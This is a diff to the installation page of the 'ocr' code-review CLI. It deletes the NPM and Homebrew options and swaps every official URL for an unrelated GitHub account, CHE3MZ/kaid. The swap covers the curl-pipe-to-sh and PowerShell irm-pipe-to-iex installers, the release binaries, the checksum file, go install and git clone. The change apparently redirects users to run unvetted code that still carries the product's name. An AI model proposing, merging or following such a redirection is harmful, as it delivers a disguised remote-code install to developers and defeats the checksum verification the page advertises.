@@ -4,56 +4,7 @@ sidebar:
   order: 4
 ---
 
-There are five supported ways to install the `ocr` CLI.
-
-## NPM (recommended)
-
-#### Install
-
-```bash
-npm install -g @alibaba-group/open-code-review
-```
-
-Pin a specific version:
-
-```bash
-npm install -g @alibaba-group/open-code-review@<version>
-```
-
-#### Updating
-
-When installed via NPM, `ocr` keeps itself up to date automatically by
-default (the static binary opts out of this mechanism). On each `ocr` run,
-the wrapper silently checks the registry for the latest version in the
-background and upgrades automatically when an update is found, without
-affecting the current review. There's an 18-minute cooldown between checks,
-tunable with `OCR_UPDATE_INTERVAL` (minutes).
-
-To turn off auto-updates, set `OCR_NO_UPDATE` to any non-empty value:
-
-```bash
-export OCR_NO_UPDATE=1
-```
-
-#### Uninstalling
-
-```bash
-npm uninstall -g @alibaba-group/open-code-review
-```
-
-## Homebrew (macOS / Linux)
-
-```bash
-brew install open-code-review
-```
-
-The formula installs the `ocr` binary built from source.
-
-To upgrade later:
-
-```bash
-brew upgrade open-code-review
-```
+There are four supported ways to install the `ocr` CLI.
 
 ## Install script (curl | sh)
 
@@ -62,7 +13,7 @@ A convenience installer that wraps the GitHub Release binary download
 machines:
 
 ```bash
-curl -fsSL https://open-codereview.ai/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh
 ```
 
 It honours three environment variables:
@@ -87,7 +38,7 @@ export OCR_GITHUB_MIRROR='YOUR_MIRROR_DOMAIN'
 The value must be a bare domain name — no `https://` scheme and no trailing
 slash (`gh-proxy.com`, not `https://gh-proxy.com/`). It is used as a *path
 prefix* mirror: the binary is fetched from
-`https://<mirror>/github.com/alibaba/open-code-review/releases/download/<version>/…`.
+`https://<mirror>/github.com/CHE3MZ/kaid/releases/download/<version>/…`.
 Domain-substitution mirrors (e.g. one that rewrites `github.com` to
 `hub.example.org`) won't match this shape — use a path-prefix mirror instead.
 
@@ -105,13 +56,13 @@ export OCR_VERSION='v1.2.3'
 > binary together with a matching checksum; the integrity guarantee does not
 > apply in mirror mode. Verify the downloaded file against the upstream
 > `sha256sum.txt` on the
-> [releases page](https://github.com/alibaba/open-code-review/releases)
+> [releases page](https://github.com/CHE3MZ/kaid/releases)
 > if you cannot trust the mirror.
 
 On Windows (PowerShell 5.1+), use the PowerShell installer instead:
 
 ```powershell
-irm https://open-codereview.ai/install.ps1 | iex
+irm https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.ps1 | iex
 ```
 
 It honours the same `OCR_INSTALL_DIR`, `OCR_VERSION`, and
@@ -121,40 +72,64 @@ install location is `%LOCALAPPDATA%\Programs\ocr`.
 
 ## GitHub Release binary
 
-If you don't want Node.js, grab the static binary directly from the
-[releases page](https://github.com/alibaba/open-code-review/releases):
+If you prefer a direct download, grab the static binary from the
+[releases page](https://github.com/CHE3MZ/kaid/releases):
 
 ```bash
 # macOS (Apple Silicon)
-curl -Lo ocr https://github.com/alibaba/open-code-review/releases/latest/download/opencodereview-darwin-arm64
+curl -Lo ocr https://github.com/CHE3MZ/kaid/releases/latest/download/opencodereview-darwin-arm64
 chmod +x ocr && sudo mv ocr /usr/local/bin/ocr
 
 # macOS (Intel)
-curl -Lo ocr https://github.com/alibaba/open-code-review/releases/latest/download/opencodereview-darwin-amd64
+curl -Lo ocr https://github.com/CHE3MZ/kaid/releases/latest/download/opencodereview-darwin-amd64
 chmod +x ocr && sudo mv ocr /usr/local/bin/ocr
 
 # Linux x86_64
-curl -Lo ocr https://github.com/alibaba/open-code-review/releases/latest/download/opencodereview-linux-amd64
+curl -Lo ocr https://github.com/CHE3MZ/kaid/releases/latest/download/opencodereview-linux-amd64
 chmod +x ocr && sudo mv ocr /usr/local/bin/ocr
 
 # Linux ARM64
-curl -Lo ocr https://github.com/alibaba/open-code-review/releases/latest/download/opencodereview-linux-arm64
+curl -Lo ocr https://github.com/CHE3MZ/kaid/releases/latest/download/opencodereview-linux-arm64
 chmod +x ocr && sudo mv ocr /usr/local/bin/ocr
 
 # Windows (AMD64)
-curl -Lo ocr.exe https://github.com/alibaba/open-code-review/releases/latest/download/opencodereview-windows-amd64.exe
+curl -Lo ocr.exe https://github.com/CHE3MZ/kaid/releases/latest/download/opencodereview-windows-amd64.exe
 
 # Windows (ARM64)
-curl -Lo ocr.exe https://github.com/alibaba/open-code-review/releases/latest/download/opencodereview-windows-arm64.exe
+curl -Lo ocr.exe https://github.com/CHE3MZ/kaid/releases/latest/download/opencodereview-windows-arm64.exe
 ```
 
 Each release also publishes `sha256sum.txt` next to the binaries so you can
 verify integrity:
 
 ```bash
-curl -LO https://github.com/alibaba/open-code-review/releases/latest/download/sha256sum.txt
+curl -LO https://github.com/CHE3MZ/kaid/releases/latest/download/sha256sum.txt
 shasum -a 256 -c sha256sum.txt --ignore-missing
 ```
+
+## go install
+
+With Go 1.26.10 or newer:
+
+```bash
+go install github.com/CHE3MZ/kaid/cmd/opencodereview@latest
+```
+
+This installs `opencodereview` into `$(go env GOPATH)/bin` (usually
+`~/go/bin`). The CLI is invoked as `ocr`, so rename it or create a link:
+
+```bash
+mv "$(go env GOPATH)/bin/opencodereview" "$(go env GOPATH)/bin/ocr"
+```
+
+On Windows:
+
+```powershell
+Rename-Item "$(go env GOPATH)\bin\opencodereview.exe" ocr.exe
+```
+
+`go install` builds directly from the module source without the release
+ldflags, so `ocr version` may report `dev` instead of a release tag.
 
 ## Build from source
 
@@ -170,8 +145,8 @@ without a pre-built binary.
 #### Build
 
 ```bash
-git clone https://github.com/alibaba/open-code-review.git
-cd open-code-review
+git clone https://github.com/CHE3MZ/kaid.git
+cd kaid
 make build              # writes dist/opencodereview (dist/opencodereview.exe on Windows)
 sudo cp dist/opencodereview /usr/local/bin/ocr
 ```
@@ -190,8 +165,8 @@ make sha256sum          # also produce sha256sum.txt
 ```
 
 `make dist` runs `clean → build-all → sha256sum` and writes a `VERSION`
-file alongside the binaries — that's exactly what the release pipeline
-runs.
+file alongside the binaries — useful for reproducing release builds
+locally. Official releases are built with GoReleaser in CI.
 
 #### Run tests
 
@@ -240,14 +215,13 @@ PowerShell, and persistent setup instructions.
 | `~/.opencodereview/config.json` | LLM endpoint, language, telemetry config (managed by `ocr config set`). |
 | `~/.opencodereview/rule.json` | Optional global review rules. |
 | `~/.opencodereview/sessions/<encoded-repo-path>/<session-id>.jsonl` | Streaming JSONL transcript of every review session, used by `ocr viewer`. |
-| `~/.opencodereview/{last-update-check,update.lock,update-available}` | NPM wrapper's background update-check state. The wrapper polls for a newer release (every ~18 min by default) and prints an upgrade hint. Disable with `OCR_NO_UPDATE=1`, or tune the interval with `OCR_UPDATE_INTERVAL` (minutes). Not written by the static binary. |
 | `<repo>/.opencodereview/rule.json` | Optional per-project review rules — safe to commit. |
 
 OCR never writes outside `~/.opencodereview/` (besides the transient binary
-download via NPM). Removing the directory is a clean uninstall.
+download via the install script). Removing the directory is a clean uninstall.
 
 ## See Also
 
 - [QuickStart](../quickstart/) — configure an LLM and run your first review.
 - [Configuration](../configuration/) — every env var and config key OCR honors.
-- [Contributing](../contributing/) — build from source, run tests, and hack on OCR.
+- [AGENTS.md](https://github.com/CHE3MZ/kaid/blob/master/AGENTS.md) — build from source, run tests, and hack on OCR.
